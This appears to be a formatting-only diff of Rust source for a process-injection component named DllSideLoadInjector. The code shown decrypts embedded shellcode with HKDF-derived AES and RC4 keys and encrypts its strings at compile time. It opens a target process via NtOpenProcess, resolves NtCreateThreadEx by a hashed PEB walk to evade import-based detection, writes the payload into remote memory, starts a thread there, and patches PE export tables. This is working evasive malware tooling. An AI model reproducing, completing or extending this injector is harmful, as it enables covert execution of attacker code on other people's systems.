@@ -76,8 +76,7 @@ fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> V
     );
 
     // ── Extract: PRK = HMAC-SHA256(salt, IKM) ────────────────────────────
-    let mut mac = HmacSha256::new_from_slice(salt)
-        .expect("HMAC-SHA256 accepts any key length");
+    let mut mac = HmacSha256::new_from_slice(salt).expect("HMAC-SHA256 accepts any key length");
     mac.update(ikm);
     let prk = mac.finalize().into_bytes();
 
@@ -92,8 +91,7 @@ fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> V
         counter = counter
             .checked_add(1)
             .expect("HKDF expand counter overflow");
-        let mut mac = HmacSha256::new_from_slice(&prk)
-            .expect("HMAC-SHA256 accepts any key length");
+        let mut mac = HmacSha256::new_from_slice(&prk).expect("HMAC-SHA256 accepts any key length");
         mac.update(&t_prev);
         mac.update(info);
         mac.update(&[counter]);
@@ -109,12 +107,7 @@ fn hkdf_sha256_derive(ikm: &[u8], salt: &[u8], info: &[u8], out_len: usize) -> V
 fn derive_payload_key() -> [u8; 32] {
     // Build-time IKM — encrypted at compile time by string_crypt.
     let ikm = string_crypt::enc_str!("SYS_PAYLOAD_KEY_SEED");
-    let okm = hkdf_sha256_derive(
-        &ikm,
-        HKDF_SALT_ENC,
-        common::hkdf_info::DLL_SIDELOAD_AES,
-        32,
-    );
+    let okm = hkdf_sha256_derive(&ikm, HKDF_SALT_ENC, common::hkdf_info::DLL_SIDELOAD_AES, 32);
     let mut key = [0u8; 32];
     key.copy_from_slice(&okm[..32]);
     key
@@ -124,12 +117,7 @@ fn derive_payload_key() -> [u8; 32] {
 #[cfg(test)]
 fn derive_stub_rc4_key() -> [u8; 16] {
     let ikm = string_crypt::enc_str!("SYS_PAYLOAD_KEY_SEED");
-    let okm = hkdf_sha256_derive(
-        &ikm,
-        HKDF_SALT_ENC,
-        common::hkdf_info::DLL_SIDELOAD_RC4,
-        32,
-    );
+    let okm = hkdf_sha256_derive(&ikm, HKDF_SALT_ENC, common::hkdf_info::DLL_SIDELOAD_RC4, 32);
     let mut key = [0u8; 16];
     key.copy_from_slice(&okm[..16]);
     key
@@ -178,7 +166,10 @@ impl Rc4State {
         }
         let mut j: usize = 0;
         for i in 0..=255 {
-            j = (j.wrapping_add(s[i] as usize).wrapping_add(key[i % key.len()] as usize)) % 256;
+            j = (j
+                .wrapping_add(s[i] as usize)
+                .wrapping_add(key[i % key.len()] as usize))
+                % 256;
             s.swap(i, j);
         }
         let mut state = Rc4State { s, i: 0, j: 0 };
@@ -193,8 +184,7 @@ impl Rc4State {
             self.i = (self.i.wrapping_add(1)) % 256;
             self.j = (self.j.wrapping_add(self.s[self.i] as usize)) % 256;
             self.s.swap(self.i, self.j);
-            let k = self.s
-                [(self.s[self.i] as usize).wrapping_add(self.s[self.j] as usize) % 256];
+            let k = self.s[(self.s[self.i] as usize).wrapping_add(self.s[self.j] as usize) % 256];
             *b ^= k;
         }
     }
@@ -242,10 +232,8 @@ impl crate::injection::Injector for DllSideLoadInjector {
         // ── 4. Open target process via NtOpenProcess ───────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES =
-            unsafe { std::mem::zeroed() };
-        obj_attr.Length =
-            std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         let access_mask = (PROCESS_VM_OPERATION
@@ -281,13 +269,12 @@ impl crate::injection::Injector for DllSideLoadInjector {
         }
 
         // ── 5. Resolve NtCreateThreadEx via PEB walk ──────────────────────
-        let ntdll_base = unsafe {
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        }
-        .ok_or_else(|| {
-            close_h!(h_proc);
-            anyhow!("ntdll not found")
-        })?;
+        let ntdll_base =
+            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
+                .ok_or_else(|| {
+                    close_h!(h_proc);
+                    anyhow!("ntdll not found")
+                })?;
 
         let ntcreate_addr = unsafe {
             pe_resolve::get_proc_address_by_hash(
@@ -313,8 +300,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
             usize,
             *mut std::os::raw::c_void,
         ) -> i32;
-        let nt_create_thread: NtCreateThreadExFn =
-            unsafe { std::mem::transmute(ntcreate_addr) };
+        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };
 
         // ── 6. Allocate RW- memory in the target process ──────────────────
         let mut remote_payload: *mut std::ffi::c_void = std::ptr::null_mut();
@@ -335,9 +321,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
                 );
             }
         } else {
-            cleanup_and_err!(
-                "DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed"
-            );
+            cleanup_and_err!("DllSideLoad: NtAllocateVirtualMemory for shellcode payload failed");
         }
 
         // ── 7. Write the decrypted payload ────────────────────────────────
@@ -433,9 +417,7 @@ impl crate::injection::Injector for DllSideLoadInjector {
                 0x8000u64,
             )
             .ok();
-            cleanup_and_err!(
-                "DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}"
-            );
+            cleanup_and_err!("DllSideLoad: NtCreateThreadEx for shellcode failed: {status:#x}");
         }
 
         close_h!(h_thread);
@@ -481,9 +463,9 @@ impl DllSideLoadInjector {
         export_config: &ExportConfig,
     ) -> Result<()> {
         use winapi::um::winnt::{
-            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
-            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
-            PROCESS_VM_READ, PROCESS_VM_WRITE, SYNCHRONIZE,
+            MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_CREATE_THREAD,
+            PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
+            SYNCHRONIZE,
         };
 
         // ── 1. Derive key and decrypt payload ─────────────────────────────
@@ -493,10 +475,8 @@ impl DllSideLoadInjector {
         // ── 2. Open target process via NtOpenProcess ──────────────────────
         let mut client_id = [0u64; 2];
         client_id[0] = pid as u64;
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES =
-            unsafe { std::mem::zeroed() };
-        obj_attr.Length =
-            std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
 
         let mut h_proc: usize = 0;
         let access_mask = (PROCESS_VM_OPERATION
@@ -623,9 +603,7 @@ impl DllSideLoadInjector {
                 );
             }
         } else {
-            cleanup_and_err!(
-                "InjectSideLoad: NtAllocateVirtualMemory near forward target failed"
-            )
+            cleanup_and_err!("InjectSideLoad: NtAllocateVirtualMemory near forward target failed")
         }
 
         // ── 6. Write the decrypted payload ────────────────────────────────
@@ -717,13 +695,12 @@ impl DllSideLoadInjector {
         .ok();
 
         // ── 10. Resolve NtCreateThreadEx ──────────────────────────────────
-        let ntdll_base = unsafe {
-            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
-        }
-        .ok_or_else(|| {
-            close_h!(h_proc);
-            anyhow!("ntdll not found")
-        })?;
+        let ntdll_base =
+            unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0")) }
+                .ok_or_else(|| {
+                    close_h!(h_proc);
+                    anyhow!("ntdll not found")
+                })?;
 
         let ntcreate_addr = unsafe {
             pe_resolve::get_proc_address_by_hash(
@@ -749,8 +726,7 @@ impl DllSideLoadInjector {
             usize,
             *mut std::os::raw::c_void,
         ) -> i32;
-        let nt_create_thread: NtCreateThreadExFn =
-            unsafe { std::mem::transmute(ntcreate_addr) };
+        let nt_create_thread: NtCreateThreadExFn = unsafe { std::mem::transmute(ntcreate_addr) };
 
         // ── 11. Execute via NtCreateThreadEx ──────────────────────────────
         let mut h_thread: *mut std::os::raw::c_void = std::ptr::null_mut();
@@ -780,9 +756,7 @@ impl DllSideLoadInjector {
                 0x8000u64,
             )
             .ok();
-            cleanup_and_err!(
-                "InjectSideLoad: NtCreateThreadEx failed: {status:#x}"
-            );
+            cleanup_and_err!("InjectSideLoad: NtCreateThreadEx failed: {status:#x}");
         }
 
         close_h!(h_thread);
@@ -833,7 +807,9 @@ unsafe fn patch_export_table(
     ]) as usize;
 
     if e_lfanew + 0x78 > local_copy.len() {
-        return Err(anyhow!("PE headers truncated (cannot reach optional header)"));
+        return Err(anyhow!(
+            "PE headers truncated (cannot reach optional header)"
+        ));
     }
 
     // Optional header offset = e_lfanew + 4 (sig) + 20 (COFF header)
@@ -1129,7 +1105,10 @@ mod tests {
 
         // Verify our HKDF matches RFC 5869 test vector.
         let okm = hkdf_sha256_derive(&ikm, &salt, &info, 42);
-        assert_eq!(okm, expected_okm, "HKDF OKM must match RFC 5869 Test Case 1");
+        assert_eq!(
+            okm, expected_okm,
+            "HKDF OKM must match RFC 5869 Test Case 1"
+        );
     }
 
     #[test]
